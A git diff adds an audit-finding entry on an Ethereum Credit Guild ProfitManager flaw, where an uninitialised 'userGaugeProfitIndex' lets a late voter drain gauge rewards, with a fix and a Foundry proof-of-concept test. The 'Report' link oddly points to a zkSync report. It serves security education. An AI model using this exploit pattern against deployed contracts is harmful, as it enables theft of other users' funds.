@@ -84,3 +84,61 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 2.[High] The userGaugeProfitIndex is not set correctly, allowing an attacker to receive rewards without waiting
+
+### Initialization
+
+- Summary: This vulnerability arises from a flaw in the **`ProfitManager`** contract where the **`userGaugeProfitIndex`** is not correctly initialized, if the user's gauge weight is zero.
+- Impact & Recommendation: As a result, the attacker can drain rewards, potentially depriving other users of their entitled rewards. To address this issue, it's crucial to ensure that the **`userGaugeProfitIndex`** is correctly set to the current `gaugeProfitIndex` when initially accessed, later when the `gaugeProfitIndex` grows the user will be able to claim the rewards.
+  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1194) & [Report](https://code4rena.com/reports/2023-10-zksync)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+
+  function testAttackClaimAfterProfit() public {
+        address attacker = makeAddr("attacker");
+        vm.startPrank(governor);
+        core.grantRole(CoreRoles.GOVERNOR, address(this));
+        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
+        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
+        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
+        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
+        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
+        vm.stopPrank();
+        vm.prank(governor);
+        profitManager.setProfitSharingConfig(
+            0, // surplusBufferSplit
+            0.5e18, // creditSplit
+            0.5e18, // guildSplit
+            0, // otherSplit
+            address(0) // otherRecipient
+        );
+        guild.setMaxGauges(1);
+        guild.addGauge(1, gauge1);
+        guild.mint(attacker, 150e18);
+        guild.mint(bob, 400e18);
+        vm.prank(bob);
+        guild.incrementGauge(gauge1, 400e18);
+
+        credit.mint(address(profitManager), 20e18);
+        profitManager.notifyPnL(gauge1, 20e18);
+        //Attacker votes for a gauge after it notifies profit
+        //The userGaugeProfitIndex of the attacker is not set
+        vm.prank(attacker);
+        guild.incrementGauge(gauge1, 150e18);
+
+        //Because the userGaugeProfitIndex is not set it will be set to 1e18
+        //The gaugeProfitIndex will be 1.025e18 so the attacker will steal the rewards
+        profitManager.claimGaugeRewards(attacker,gauge1);
+        console.log(credit.balanceOf(attacker));
+        //Other users will then fail to claim their rewards
+        vm.expectRevert(bytes("ERC20: transfer amount exceeds balance"));
+        profitManager.claimGaugeRewards(bob,gauge1);
+        console.log(credit.balanceOf(bob));
+    }
+
+  ```
+
+  </details>
